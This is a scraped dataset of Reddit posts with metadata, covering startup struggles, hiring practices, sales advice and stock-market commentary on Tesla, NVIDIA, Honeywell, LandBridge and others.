are the following:\n\n1. For those of you who are or were in my boat, I’d love to hear how your experience has been since cutting out that destructive part of your life? Has it been a night and day difference?\n\n2. Do you have any wisdom, tips, cautions, etc. that you can share? Perhaps some advice you were told long ago that helped, or even strategies that you came up with by yourself?\n\n3. Anything else that you’d like to share! :)\n\nAs we all know, staying motivated can be hard, and unfortunately I don’t have many high achievers in my life that understand the struggle. While there’s plenty of recovery advice out there, I think it would be a huge help for me personally to hear from members of our community specifically.\n\nSorry for the long post, &amp; if you read it all the way through, thank you very much for listening!\n\nEDIT: In case anyone’s hesitant to comment publicly, I understand.

You're fighting Carvana, CarMax, every dealership group, Autotrader, Cars .com, and CarGurus for the same keywords. Anything remotely high-intent is $30-80 CPC. You need to make thousands per customer just to not lose money on paid search.\n\nSEO? Forget it. KBB, Edmunds, and the aggregators have 15-20 years of domain authority. You're not cracking page one without a decade of work or black hat bullshit that'll get you penalized anyway.\n\nMeta/social? The big players have pixel data on millions of transactions and can retarget people who literally already have their app installed or visited their site. Your cold acquisition campaigns are DOA against that.\n\nPartnerships and affiliates? Already locked up or demanding terms that only work at massive scale you'll never reach.\n\n**And the unit economics are just as fucked.** Whether you're selling cars, providing SaaS tools, running a marketplace, or doing lead gen - the margins are razor-thin and the retention is garbage because people barely think about cars except when they're buying or something breaks. You're spending $500-1000 to acquire someone who might give you $50 in LTV if you're lucky.\n\nEven the companies that raised huge rounds seem to just be slowly bleeding out with better PR. They'll talk about \"scaling efficiently\" and \"path to profitability\" while their CAC keeps climbing and their burn rate stays astronomical. The 2021 vintage automotive startups are running on fumes and hoping they can raise again before everyone notices the math never worked.\n\nI keep hearing about pivots to B2B, about \"just needing more scale,\" about how \"the market is finally ready\" - but it all sounds like cope. Everyone's acting like they're one partnership or growth hack away from making it work, but nobody's actually showing sustainable unit economics.\n\nSo seriously: has anyone actually cracked this? Like actually profitable, not \"we'll be profitable at our projected scale in 2027\" bullshit. Or should we all just admit that consumer automotive is a fundamentally terrible category now unless you raised $100M+ in the ZIRP era and can afford to light money on fire indefinitely?\n\nWhat am I missing here, or is everyone just too proud to admit they're building in a dead category?", "author": "cardogio", "subreddit": "startups", "score": 46, "upvote_ratio": 0.9, "num_comments": 15, "created_utc": "2025-10-02T06:49:23", "url": "https://www.reddit.com/r/startups/comments/1nvlnpl/has_anyone_actually_made_consumer_automotive_work/", "permalink": "https://reddit.com/r/startups/comments/1nvlnpl/has_anyone_actually_made_consumer_automotive_work/", "is_self": true, "domain": "self.startups", "tech_keywords": ["AI", "AR", "profit", "growth", "acquisition"], "crawled_at": "2025-10-03T13:57:07.759971", "sentiment_score": {"vader_compound": -0.847, "vader_positive": 0.084, "vader_neutral": 0.812, "vader_negative": 0.104, "textblob_polarity": -0.03903318903318905, "textblob_subjectivity": 0.47619047619047616, "overall_sentiment": "negative"}},

{"post_id": "1nuu67a", "title": "Exploitative Unpaid \"Work Trials\" in Tech - My Experience Interviewing at Cursor (I will not promote)", "content": "I recently interviewed with Cursor (Anysphere), and as part of the process they required me to do a 2-day unpaid \"work trial\". I found this to be an exploitative and unethical hiring practice. I’ve never had anything like this before in my career, but looking around, it seems like this does happen. I wanted to make this post to open up a broader discussion about the practice of unpaid \"work trials\" in tech (or otherwise), to get a sense of how common this really is, and to raise awareness that we can collectively push back on this.\n\n**Productive Work Trials Should be Paid**\n\nA company which uses your work trial to actually build something meaningful to the company (like prototyping a product feature), and doesn’t pay you for that, is straight-up exploiting you for free labor. Companies could either:\n\n* Have an unpaid work trial that doesn’t contribute value to the company, or\n* Have a paid work trial where the candidate works on real projects\n\nBut Cursor wants to have it both ways. Without going into too many specifics, the work trial project was not just an isolated project for me to demo my skills, but left me feeling that they could potentially get real shippable value out of it, if they wanted. Additionally, their work trial agreement included language about ownership of intellectual property produced during the trial. If the work had no potential for value to Cursor, why would they care about that?\n\nIt's probably unique to each company in what ways they might extract value from us candidates, but generally watch for situations where they ask you to do things which could be re-used by the company for a product or something.\n\nThis is IMO exploitative and unacceptable, and we should all push back on places that try to pull this.\n\n**Collectively Pushing Back**\n\nFirst, share your stories. I (and probably a good number of other folks) prefer to work at places that have at least decent ethics and workplace culture. I genuinely don’t know how common this really is outside of Cursor, but I’d love to know what other places do this, so I can avoid them in the future. We are the talent, and we should bring our talent to places that value it. (I know the job market is rough, and this makes it hard to be picky…).\n\nSecond, and 100% I’m not a lawyer, but generally speaking unpaid work trials in which you perform productive work is not only unethical, but likely illegal (at least for a work trial in California). The California DLSE manual states that work trials (\"try out time\") can be unpaid only if \"there is no productivity derived from the work performed by the prospective employee\". Its really easy to file a report of labor law violations online on the DLSE’s website. If you believe you were unfairly used for free labor (and the work trial took place in California), consider filing a DLSE report. It only takes about 15 minutes and helps hold companies accountable.", "author": "Waste_Divide_1243", "subreddit": "startups", "score": 33, "upvote_ratio": 0.86, "num_comments": 30, "created_utc": "2025-10-01T09:38:51", "url": "https://www.reddit.com/r/startups/comments/1nuu67a/exploitative_unpaid_work_trials_in_tech_my/", "permalink": "https://reddit.com/r/startups/comments/1nuu67a/exploitative_unpaid_work_trials_in_tech_my/", "is_self": true, "domain": "self.startups", "tech_keywords": ["AI", "AR", "share"], "crawled_at": "2025-10-03T13:57:07.801065", "sentiment_score": {"vader_compound": 0.9946, "vader_positive": 0.138, "vader_neutral": 0.805, "vader_negative": 0.057, "textblob_polarity": 0.0619496855345912, "textblob_subjectivity": 0.46698113207547165, "overall_sentiment": "positive"}},

(I will not promote)", "content": "Hey guys,\n\nLooking for some advice.\n\nOver the last 3 years I've acquired 6 micro SaaS apps across 4 deals. I've spent in total almost $200k acquiring these SaaS. The portfolio is currently at 77k ARR and growing slowly.\n\nI run this portfolio myself and for the most part everything is on auto-pilot. The play so far has been to acquire slow growing, high margin B2B SaaS that provide a lot of cash flow with little time commitment. These are basic, mature apps.\n\nI've funded these deals from profits from my agency which has been doing between $200k - $250k in revenue the last few years. I own 100% of the software holding company and have never raised any funding for it.\n\nI'm considering going all in on the SaaS model and to raise $1M at a $5M pre-money valuation.\n\nThis capital would be used to finance a larger acquisition ($350k - $750k) and provide some runway for growing a small team and to invest in growth. This would provide a solid foundation so we can scale MRR aggressively while having sufficient runway in the bank. This would lead to more capital for further acquisitions and significant compounding.\n\nThe long-term play would be to grow a large, diversified software holding company similar to Constellation Software which can go public or be acquired by another holding co or PE.\n\nSome questions for you:\n\n1. Based on what I've shared above, how likely would angels / VCs be interested in investing in such a model? Why would / wouldn't they?\n2. Since this would be the first time I'm raising funding for the business, I'm not sure on the valuation.

{"post_id": "1nuhe1e", "title": "[I will not promote] how to actually close deals from cold outreach leads", "content": "When I first started doing outbound several years ago, I thought getting a simple positive reply was the win.\n\nCalls landed on my calendar, I felt like I was making progress but then nothing closed. Deals stalled, leads went dark, and I had no clue why.\n\nNow I run a lead gen agency where we help b2b companies attract mid-size and enterprise-qualified leads, bringing 20–40 qualified calls every month.\n\nWhen I work my own pipeline, taking a cold lead all the way from first reply to closed deal, the process is still far from perfect. But \\~25% of qualified cold leads convert into a deal within a 2-month cycle. And the difference always comes down to three things: discovery, trust, and patience with the deal cycle.\n\n1/ You need to study the lead before you pitch so your offer feels like something they can’t afford to ignore.\n\nUsually I use the first call for this, but async works too (depends on the lead).\n\nYour offer either saves the business money or helps them make more. To figure out how, you need to ask:\n\n1. Are you speaking with someone who can actually move the deal internally?\n2. What numbers and details describe their situation today (from their own words)?\n3. Where do they want to be, and what time/money are they ready to invest to get there?\n4. How much of a priority is this?\n5. What alternatives are they looking at, and what criteria are they comparing?\n\nOnly after that can you put together a proposal. Sometimes you’ll find your product isn’t needed, your price is too high, or your features don’t match. That’s fine,  at least you know what’s going on, instead of guessing why they didn’t buy.\n\n2/ The lead came in cold. Most likely, they’ve never heard of you. Even if the offer is perfect, everyone in the buying center will ask the same thing: *“Are we sure this guy isn't  bullshitting?”*\n\nAnd the only way to answer that (beyond being a decent human and sounding like an expert) is proof: cases and references from real people in the industry.\n\nFrom my own experience selling into US companies with 1000+ employees, the format doesn’t matter. A case scribbled on a napkin works if the numbers are clear and specific.\n\nThat’s why we only launch outreach (for ourselves and for clients) in industries where we can actually back it up with cases. If there’s no trust in the market yet, it’s too early for cold sales.\n\n3/ Unfortunately, companies don’t buy right away.\n\nAt big ones, the approval process can take months, even with a strong champion pushing the deal.  \nAt small ones, priorities change about every hour, and your initiative can get pushed back for months.\n\nThe solution: regular follow-ups, plus publishing new cases and content to stay visible.\n\n**tldr:** booking calls is step one. Closing them takes:\n\n**Discovery**, so your offer is built on the lead’s reality.  \n**Trust**, so they believe you can deliver.  \n**Patience**, so you stick around long enough for timing to work.\n\nMiss any of these, and deals stall.

My perfectionism has turned the MVP into a beta, and I just launched last week. I know I should have built less and validate quicker, but my perfectionism creeps in... Anyway, now I'm looking for beta testers to try out the app and collect feedback via survey that includes a few important questions like which features they like/dislike, what features they think is missing, how likely they'll recommend to a friend, how much they'll pay for it, etc. I'm offering a lifetime premium access to the app if they tried the app for 7 days and submitted the survey.\n\nMy goal is to get \\~30-50 survey results (is it too less or too much?) to inform how I should pivot the app that meets the users' needs. In the meantime, I'm looking to start building content on LinkedIn (main), X, Instagram and potentially Facebook. I also need to build content for my app website so that it appears higher in the Google search (it's practically not searchable right now unless the user enters the full URL). The third thing I have in mind is to start building a small team of tech co-founders/dev, UX/UI designer and an illustrator. You may say I should validate the app first before proceeding to this step, however I need a dev (I'm non-technical) to bring my final form of idea to life (involves more complicated gamification system, AI and better illustrations) that can truly demonstrate the value of the app. \n\n\n\n**TLDR:** \n\n* I just launched beta web app.\n* I'm currently looking for beta testers to validate my app. \n* What's next? \n   * Continue beta test (how many is good?)\n   * Focus on content and promoting\n   * Hire core team to develop the final version of the app \n\n  \nThank you in advance for your advice/suggestions!

However, we have a P/E over 31, and a Shiller P/E over 40, history tells us this won't end pretty.\n\nLets look at the numbers and model out the scenarios, to see what we can expect for returns.  \nFor this model we need a low, medium and high terminal P/E (what P/E will the S&amp;P 500 end at in 10 years)  \nand we need low, medium and high estimated earnings growth numbers.\n\nHistorically P/E has a median of 15, this is too low since it goes back to the 1800s, but in the past 50 years, the P/E median is \\~20, in the past 20 and 10 years, it's \\~25.\n\nSo let's go with:\n\n* low: 20\n* mid: 25\n* high: 30\n\nFor growth estimations I looked at the past 20 years of earnings, 50% of the years were below or equal to 4% CAGR, which means this is most likely, and 20% of the years were above or equal to 8% CAGR.\n\nTo give some room for more expected growth, let's go with:\n\n* low: 4%\n* mid: 6.5%\n* high 10% (only seen 4 times since 1880)\n\n*(Note: these aren’t conservative.)*\n\nWe now can get the terminal value:\n\nTerminal value = current EPS \\* (expected growh rate)\\^10 years  \ncurrent EPS = 219.52\n\nFrom here we can see what Compounded Annual Growth Rate will get to the current share price from the terminal value in 10 years. For my estimations I get the following annual returns from the estimations:\n\n* high: \\~9% annual return\n* mid: \\~4.7% annual return\n* low: \\~1% annual return\n\nThis shows another picture of what is preached about 10% annual returns.\n\n**Before the AI bulls comment, please read the section in my article about AI.**\n\nThe S&amp;P 500 is priced for perfection.

{"post_id": "1nwpsor", "title": "Mandatory Market Shift: Why Digital Assets are Now a Diligence Issue, Not a Speculation Play, Post-SAB 122", "content": "The long-term investment landscape has fundamentally shifted. The SEC’s rescission of Staff Accounting Bulletin 121 (SAB 121) in January 2025 opened the institutional floodgates by removing the capital barrier that prevented major, regulated banks from holding crypto for clients. This means digital assets are now moving from a speculative category to a mandatory risk and diligence category.  \n\n1) The New Risk Floor: This institutional entry dramatically lowers the systemic risk profile for investors, meaning the barriers for large pools of capital (pensions, endowments) to justify entry are crumbling. The question is no longer if they should invest, but when.  \n\n2) Tokenization as Portfolio Standard: Tokenized products are expected to shed their niche status and become standard menu items in mainstream portfolios by the end of 2025. This includes new RWA products like treasury-backed tokens that major banks are poised to offer directly to institutional clients.  \n\n3) The Diligence Race: The current strategic challenge is the immediate race by major bank custodians to secure written non-objection from the FDIC, OCC, and Federal Reserve. Diligence must now include assessing which banks are best positioned to capture this regulated first-mover advantage.  \n\nWhat's your take? As an investor, is the biggest risk now missing out on the early, regulated RWA offerings, or is the lack of alignment among the FDIC and OCC still too large a regulatory uncertainty?", "author": "Narrow_Chance7639", "subreddit": "investing", "score": 0, "upvote_ratio": 0.33, "num_comments": 5, "created_utc": "2025-10-03T13:39:25", "url": "https://www.reddit.com/r/investing/comments/1nwpsor/mandatory_market_shift_why_digital_assets_are_now/", "permalink": "https://reddit.com/r/investing/comments/1nwpsor/mandatory_market_shift_why_digital_assets_are_now/", "is_self": true, "domain": "self.investing", "tech_keywords": ["AI", "AR", "investment", "portfolio"], "crawled_at": "2025-10-03T13:57:07.928955", "sentiment_score": {"vader_compound": 0.7038, "vader_positive": 0.1, "vader_neutral": 0.818, "vader_negative": 0.082, "textblob_polarity": 0.10993677375256324, "textblob_subjectivity": 0.33243335611756664, "overall_sentiment": "positive"}},

{"post_id": "1nufyxd", "title": "Honeywell, spin off, next General Electric? Opportunity? Division into 3 new companies: Materials, Automation and Aviation.", "content": "In 2021, General Electric decided to dismantle its historic conglomerate by dividing it into three autonomous companies: GE Aerospace, GE Vernova and GE HealthCare.\n\nThe overall capitalization of the three companies rose to around 474 billion dollars, compared to 290 billion before the split. In other words, the market recognized over 180 billion in additional value thanks to the separation.\n\nWhy does this happen? There are three main reasons. First: conglomerates often suffer from a market \"discount\", because investors struggle to give the right value to very different businesses. By separating them, each company becomes more readable and comparable to direct competitors. Second: capital management improves, because each entity can invest without having to compromise with the needs of other divisions. Third: a dedicated board of directors and management can move with greater clarity and accountability.\n\nLet's talk about Honeywell. Today the company is organized into four major areas: Aerospace, Safety and Productivity Solutions, Building Technologies and Energy and Sustainability. Translated into a post-spinoff scenario, we could imagine three companies: Honeywell Aerospace, Honeywell Automation (which would combine the first two non-aerospace divisions), and Solstice Advanced Materials, focused on specialty chemistry and decarbonization technologies.\n\nThe shareholder letter decided to give 1 share of solstice for each share of Honeywell. The split of the other 2 divisions is expected at the end of 2026.\n\nThe Aerospace segment is by far the strongest and represents the main source of revenue. Honeywell supplies avionics, engines and auxiliary systems to giants such as Boeing and Airbus, but also to military aircraft and even future eVTOLs such as those from Joby Aviation. In addition to this, a significant portion comes from after-sales services: maintenance, repairs and overhauls which guarantee recurring flows.\n\nHoneywell Automation, on the other hand, would focus on industrial automation, intelligent warehouses and security solutions. Think of scanners, robotics and voice-picking systems in Amazon warehouses, gas detectors and PPE for industrial workers, or energy and fire management systems for complex buildings such as airports and university campuses.\n\nFinally, Solstice Advanced Materials would represent the “greener” and more futuristic side: CO₂ capture, green hydrogen, advanced battery materials and sustainable chemical solutions. A reality in its own right, with a positioning perfectly in line with the ESG priorities of global investors.\n\nFor an investor there are three paths.

Call me naive but I just don't see a world where chatgpt doesn't exist anymore or one where people use less AI in the future. Even though the LLM companies are not ideal investments, their products are ridiculously good and it is no secret that all the corporations in the world, say in 10 years, will have significantly higher automation than it does today.\n\nMy guess is that these big ones (example OpenAI) are almost too big to fail. If there are concerns about liquidity Sundar or Satya or Zuck would probably swoop in to strike a deal with them. Given this assessment and the idea that the world tomorrow would use more AI than it does today, probably a good idea to invest in something like Dell I think, which is currently at a P/OCF of 13 and pouring large amounts into making data centers.

In this way, his number of shares and stake would remain the same as before 2025, but he managed to print more than 100 million $ in cash on quantum hype. \n\nThis is more than the projected revenue of IONQ for 2025, which is between $82 million and $100 million (and remember, net is still negative) \n\nQuite a good deal. \n\n\"Nothing is true, everything is permitted\"", "author": "phoenix-of-zen", "subreddit": "stocks", "score": 21, "upvote_ratio": 0.81, "num_comments": 19, "created_utc": "2025-10-02T19:47:18", "url": "https://www.reddit.com/r/stocks/comments/1nw0exe/insider_trading_analysis_of_ionq_ceo_niccolo_de/", "permalink": "https://reddit.com/r/stocks/comments/1nw0exe/insider_trading_analysis_of_ionq_ceo_niccolo_de/", "is_self": true, "domain": "self.stocks", "tech_keywords": ["AI", "AR", "stock", "share", "revenue"], "crawled_at": "2025-10-03T13:57:08.044642", "sentiment_score": {"vader_compound": -0.4553, "vader_positive": 0.065, "vader_neutral": 0.875, "vader_negative": 0.059, "textblob_polarity": 0.033617424242424226, "textblob_subjectivity": 0.41969696969696973, "overall_sentiment": "negative"}},
{"post_id": "1nvg1dy", "title": "Reminder - Tesla sales trending down, maybe unprofitable 3Q from no emissions credits, and taxi still has safety drivers - stock UP 30% Lol", "content": "The absurdity of Tesla knows no bounds. \n\n* Publicly available China sales data- which is about 35% of Tesla's sales - is still down 9% year over year, and Europe sales are still falling. American sales expect a bump due to loss of tax credits, but with Elon's alignment with Trump in the US generally hurting American sales, and significantly increased EV competition in the US, that bump is likely to be marginable at best. Accordingly, Tesla EV sales are still virtually guaranteed to be down year over year this quarter, stagnant at best. Remember, in 2020 Elon and Tesla bulls were projecting a ramp up to 20 million car sales per year (traditional EV sales, not robotaxi sales) by 2030. They've been stagnant - now decreasing - at under 2 million car sales for over a year now. \n\n\n\n* Worse still, the revenue from automotive regulatory credits will drop to zero starting this quarter, as emissions penalties were eliminated under the Trump administration. Notably, those emissions credits have accounted for, on average, 50% of Tesla's net income over the past 5 quarters; and, 1Q2025 would have actually had a negative net income of -$186 million without the $595 million in income from selling automotive regulatory credits that quarter. \n\n\n\n* And, while robotaxi is interesting and technologically, looks like it's trending towards feasibly working, Tesla still has safety drivers in the markets its operating in -which is mainly Austin at the moment - despite Musk saying it would reach half the U.S. population by the end of the year.  And, recent autonomous driving disclosures to the NHTSA indicate that in the most recent August month Tesla had 3 accidents for having less than 30 cars on the road, a ratio of 0.3/car/month. Waymo, in contrast had 51 incident reports in August for its 1,500 cars on the road across the country, a ratio 0.03/car/month and a factor of 10 less incidents per car per month than Tesla. And, while Musk has touted that Tesla is the leader in robotaxi for something like 8 years now, not only has Waymo factually rendered more autonomous rides with dramatically more mileage and, at this point, had demonstrated to be a working technology; but more and more competitors are popping up, such as Zoox in the U.S.; and pony.ai, BYD, and Baidu in Asia. Which is to say, competition is coming, and some would say has already come and surpassed Tesla, for the robotaxi space as well. \n\n\n\n* Additionally, if one takes a step back and compares the robotaxi market to the current ride-share market - as that's likely what it will displace since most people that own cars will presumably still want to have their own car - even assuming mature, robust market share and profit margins, the valuation is still probably under $300 range. For example, by my back of the envelope math there were approximately 100 billion ride share miles rendered worldwide in 2024. If you assume Tesla had 50% of that market (which is generally an unheard of market share in a market with decent competitions - Apple, for example, has a 25% global market share); and, assuming that, pursuant to Musk's own projections, the cyber cab was able to get cost per mile down to $0.30/mile, and they charged a reasonable $1/mile to riders, and that does not go lower with more competition; that would give 100 billion miles \\* 0.5 market share \\* $0.70 profit per mile = $35 billion profit off of robotaxis per year. $35 billion/3.4 billion shares = $10.29 per share and giving that a P/E of 30 gives you $308 target price. In other words, in a mature industry where Tesla robotaxi's had global reach and 50% market share, and profit margins of 70% per mile, the high price is still only $300 a share. \n\n**Tesla is up 30% this month to $450 a share as of today**, and likely trending towards a P/E of over 300 as it's EV sales profits are likely trending towards a range of $1 to $2. **Gotta love the American stock market!**", "author": "JuanPabloElTres", "subreddit": "stocks", "score": 384, "upvote_ratio": 0.87, "num_comments": 289, "created_utc": "2025-10-02T03:19:43", "url": "https://www.reddit.com/r/stocks/comments/1nvg1dy/reminder_tesla_sales_trending_down_maybe/", "permalink": "https://reddit.com/r/stocks/comments/1nvg1dy/reminder_tesla_sales_trending_down_maybe/", "is_self": true, "domain": "self.stocks", "tech_keywords": ["AI", "AR", "stock", "share", "revenue", "profit", "valuation"], "crawled_at": "2025-10-03T13:57:08.048666", "sentiment_score": {"vader_compound": 0.9981, "vader_positive": 0.148, "vader_neutral": 0.816, "vader_negative": 0.037, "textblob_polarity": 0.15070940170940172, "textblob_subjectivity": 0.4437777777777778, "overall_sentiment": "positive"}},

However, there is a crisis of purpose for many. Fitness can help fill that void.\n\n2. The proliferation of Social Media. We've become inundated with photos and videos of what \"perfect\" bodies should look like. This has fostered a desire in people to try and achieve that for themselves.\n\n3. GLP-1 drugs. Adoption of these drugs will rise rapidly in the years to come. With it will come a desire to ramp up exercise, in order to justify both the results that people are getting from these drugs and their high cost.\n\n4. Protein centric marketing. Starbucks just added protein infused coffee to their menu. \"Protein\" really is the marketing buzzword of the day. \n\nAlthough I primarily have publicly traded stocks in mind, could you provide me a few tickers (ETFs are great as well) that I can invest in which are **best poised to capitalize on this revolution**?

{"post_id": "1nwecat", "title": "NVIDIA is climbing again could this be the real long-term bet?", "content": "I’ve been following Tesla and NVIDIA closely, and honestly, the contrast between the two couldn’t be more fascinating.\n\nTesla just reported a massive milestone: **497,099 vehicles delivered in Q3**. That’s not just growth  it’s a record that shows how strong demand still is. Yet the stock dropped about –4% in the session, which makes me think the market is reacting more to sentiment and macro noise than to the fundamentals. Tesla remains polarizing: some call it the future of EVs, others still see a bubble.\n\nBut **NVIDIA** feels different. The stock popped **+3 to 4%** on news it will resume AI chip sales to China after the U.S. eased restrictions. That’s huge. Add to that the steady wave of institutional inflows, and it’s clear that big money is doubling down on AI. The narrative is powerful, the fundamentals are strong, and global demand is only accelerating.\n\nAs a trader, I see two clear paths:\n\n* **Play Tesla short term**, with leverage for example through RWA Index Perpetual Futures  which let you trade tokenized stocks. I think platforms like Bitget offer that now.\n* Or lean into NVIDIA long term, riding the unstoppable momentum around AI.\n\nPersonally, I’m much more aligned with the second scenario.

{"post_id": "1nw29np", "title": "Tesla gears up for Q3 deliveries… while Musk buys $1B in shares and Robotaxis expand", "content": "Tesla is set to report Q3 deliveries on October 2, and analysts are raising expectations. William Blair’s Jed Dorsheimer now projects 480,000 vehicles, up from 437,000 and well above Wall Street’s 443,000 consensus. The increase is tied to strong U.S. demand, a rebound in China, and a pull-forward of buyers ahead of expiring EV tax credits.  \n  \nAt the same time, Elon Musk purchased $1 billion worth of Tesla stock and the company announced an expansion of its Robotaxi program. These developments have fueled renewed bullish sentiment around the stock.  \n  \nThat said, not everything points up. Analysts caution that Q4 margins may face pressure as delivery growth slows and revenue from regulatory credits declines. Tesla also trades at a steep valuation, around 118× projected 2026 EBITDA, compared to the 20–25× range of most tech peers. Risks remain in the form of strong Chinese EV competition, Tesla’s reliance on China, and the “key-man risk” linked to Musk.  \n  \nAcross Wall Street, Tesla holds a consensus “Hold” rating, with 15 Buys, 12 Holds, and 8 Sells, and an average target of $346.57 (around 22% downside from current levels).  \n  \nPosition disclosure: I currently hold a TSLA futures position on Bitget. I took the trade after Musk’s share purchase and the Robotaxi expansion news, and it has been profitable so far.  \n  \nWhat strikes me is the tension here: on one hand, bullish catalysts like stronger deliveries, Musk’s buy, and the Robotaxi rollout; on the other, valuation risks and Q4 margin concerns.  \n  \nQuestion to the sub: Do you think Tesla’s Q3 deliveries and Musk’s $1B purchase will be enough to support the stock at these valuation levels, or are we looking at a potential correction in Q4?", "author": "Imaginary-Library-80", "subreddit": "stocks", "score": 0, "upvote_ratio": 0.44, "num_comments": 40, "created_utc": "2025-10-02T21:22:30", "url": "https://www.reddit.com/r/stocks/comments/1nw29np/tesla_gears_up_for_q3_deliveries_while_musk_buys/", "permalink": "https://reddit.com/r/stocks/comments/1nw29np/tesla_gears_up_for_q3_deliveries_while_musk_buys/", "is_self": true, "domain": "self.stocks", "tech_keywords": ["AI", "AR", "stock", "share", "revenue", "profit", "growth", "valuation"], "crawled_at": "2025-10-03T13:57:08.113816", "sentiment_score": {"vader_compound": 0.9747, "vader_positive": 0.125, "vader_neutral": 0.828, "vader_negative": 0.046, "textblob_polarity": 0.10654761904761907, "textblob_subjectivity": 0.4547619047619048, "overall_sentiment": "positive"}},

{"post_id": "1maxpqx", "title": "LandBridge ($LB) short report: Stress testing Gotham City Research’s claims", "content": "I’m seeing plenty of aggregator blurbs and quick takes on X, but almost zero rigorous discussion of Gotham City Research’s 7/24/25 short report on LandBridge ($LB). \n\nPDF link here (original source): https://www.gothamcityresearch.com/landbridge-report\n\nHere’s my summary of their thesis: \n1. Up to 55% of FY24 revenue could be “circular” via related-party WaterBridge/Powered Land deals.\n2. $8M data-center deposit allegedly booked as revenue in violation of GAAP principles. Powered Land was incorporated the same day the lease was announced but little public disclosure about the company. \n3. Produced-water royalties over 2x that of TPL’s, which Gotham argues the pricing isn’t sustainable.\n4. Deloitte audited the financials, but LB used lax Emerging-Growth-Company requirements as loophole to skip an internal-controls audit.\n5. Mixed audit-committee track record: two directors previously served on boards that later restated financials. Previous CFO had abruptly left the company following the IPO and there’s still no public info explaining why. \n6. Texas RRC wastewater-disposal rules effective June 2025 could lift disposal costs 20-30% and squeeze LB’s water-royalty economics.\n7. Texas Supreme Court’s June 2025 “Cactus Water” ruling clarifies produced-water ownership in favor of mineral lessees, potentially undermining LB’s pricing power.\n8. If closed-loop cooling / water-recycling tech scales, brackish-water demand (and thus LB’s surface royalties) could fall. This risk was barely mentioned in the S-1.\n\nThus far, I have only seen superficial reactions online to what promoters say is a “bogus report” from a biased firm looking to cover their short position. While I think the framing of some points are skewed (e.g., one of the two audit members had been brought in to help clean up an embattled company’s financials, which is arguably a positive attribute), I think some of these serious issues have merit.\n\nWhat are others’ thoughts?\n\nDisclosure: I’m long $LB, one of my largest position sizes.

{"post_id": "1m55ghq", "title": "Salmon industry analysis", "content": "Hi   \nI've been posting free articles of my own on this sub for quite some time. I believe that they provide good value to members of the sub, but some members have complained that it is not fair to simply post the links, because it is self-promotion, and because after two weeks, the articles go paywalled. Following the suggestion by u/ebisure I'm posting a small summary here, so that at least part of the content remains on the sub, and to make discussion easier. \n\n  \nSalmon is one of the most interesting commodity industries. \n\nIt is a commodity, it has cycles, but it also enjoys rents that are generated by environmental and regulatory constraints to supply expansion. This makes some of the companies in the industry very profitable across the cycle, particularly the Northern European ones like Mowi, Salmar, Leroy, and Bakkafrost. The revenues and margins of these companies do cycle, but at all points in the cycle, their profitability remains elevated. \n\nThe salmon market is currently undergoing a down portion of its cycle, since at least 2021/22. The main driver, in my opinion, has been less aggressive demand, which has not bid up prices as much as during post-COVID. Supply has been very restrained, not growing in the aggregate since 2021. \n\nHowever, this year and in 2026, supply is probably going to increase significantly, probably leading to an accentuation of the lower margin situation. I hope this is the case, because at that point, the major companies, which I consider top-quality producers, might trade at attractive valuations. \n\nCurrently, I believe that these companies can grow at 8% across the cycle, and can offer an FCF yield of about 3%, or a 10/11% return over time. I don't think this is particularly attractive, but rather fair. That's why I hope a more challenging 2025/26 season leads to lower stock prices. \n\nIn the long term, the industry is threatened by the (still nascent) effort to cultivate salmon on land-based facilities that eliminate the natural constraints to supply expansion, and therefore lead to a completely different industry. Some people believe land-based will never be competitive, or only with a low probability, while others believe it is almost certain that at some point land-based production will be competitive. I'm somewhere in between, although without enough technical knowledge to judge this correctly.

The proposal is from their CEO (the son of the founder) and some members of the management team and their Board of Directors (let's call this group the potential buyers). I think their offer is way too low (they are offering at least a 10% premium to the 90 day average before July 1st, when their stock was trading at very low prices, so roughly $15.00). The potential buyers only own 5.01% of the outstanding stock, they will have some convincing to do - and if you ask me, that convincing could be best done by offering a fair price, which has to be at least net book value (which [was at $25.98 last quarter](https://www.fonar.com/news/05152025.html)), or actually even quite a bit more than that.\n\nThis situation is looking somewhat similar to [Willis Lease Finance Corporation (WLFC)](https://finance.yahoo.com/quote/WLFC/), where the founders have been trying to take the company private for years, usually offering too low prices. WLFC's stock price went from $50 to above $200 in the process (now back to a bit lower again).\n\nThis is certainly going to become quite interesting.", "author": "BeGoodToTheTime", "subreddit": "SecurityAnalysis", "score": 8, "upvote_ratio": 1.0, "num_comments": 1, "created_utc": "2025-07-10T18:06:13", "url": "https://www.reddit.com/r/SecurityAnalysis/comments/1lw80nl/update_fonar_fonr_receives_management_buyout_offer/", "permalink": "https://reddit.com/r/SecurityAnalysis/comments/1lw80nl/update_fonar_fonr_receives_management_buyout_offer/", "is_self": true, "domain": "self.SecurityAnalysis", "tech_keywords": ["AI", "AR", "stock"], "crawled_at": "2025-10-03T13:57:08.140178", "sentiment_score": {"vader_compound": 0.9787, "vader_positive": 0.123, "vader_neutral": 0.837, "vader_negative": 0.04, "textblob_polarity": 0.12075892857142859, "textblob_subjectivity": 0.4516592261904762, "overall_sentiment": "positive"}},

It's a Chinese company listed in Hong Kong that provides property management services. It holds minimal properties itself. What caught my eye is that it was \"punished\" alongside other real estate related companies in China due to property crisis there without being fundamentally affected itself. The stock price has fallen over 90% from all-time highs, whereas revenues have been only increasing (average revenue growth of about 11-12% per year over the past 5 years), it has been paying dividends for several years nontsop (current yield at around 7-8%), it holds much more cash than total liabilities (around 1580 m in cash and equivalents vs 960 m in total liabilities) , and it is selling at a Graham-style below liquid asset value. In fact, it is selling even at a negative EV. If you dig deeper into its sources of income, its business is expanding as properties it is managing are increasing. What do you think guys?

{"post_id": "1lbd0k4", "title": "2 investment ideas from Columbia Business School’s Analyst’s Edge (Fall 2024)", "content": "Today, I’m returning to Columbia Business School (CBS) once again to explore a third source of ideas: the latest student investment theses from *The Analyst’s Edge — Fall 2024 edition.*\n\n  \nThe Analyst’s Edge is an application-only course at CBSwhere 8 to 10 students each year learn what it takes to become world-class investors. Each student writes a full investment thesis on a stock of their choice — often actionable, deeply researched, and grounded in the Graham &amp; Dodd investing tradition that has long shaped Columbia’s value investing culture.\n\nIn this post, I’ll share what I found after reading this latest batch of theses. The ideas range from global compounders to special situation plays — all written with the disciplined lens of fundamental investors.\n\n\n\n# MercadoLibre (MELI)\n\n*Recommendation: Long*\n\n*Analyst: Chris Zeng*\n\nThe thesis on MELI highlights the company’s position as the dominant e-commerce and fintech platform in Latin America, with a powerful ecosystem and long runway for growth. The analyst argues that MELI will continue to benefit from secular trends driving digital adoption across the region, while its unique integrated model — combining marketplace, payments (Mercado Pago), credit, logistics, and other services — deepens its competitive moat.\n\nMELI holds the #1 market share in Latin America for e-commerce, with significant advantages in 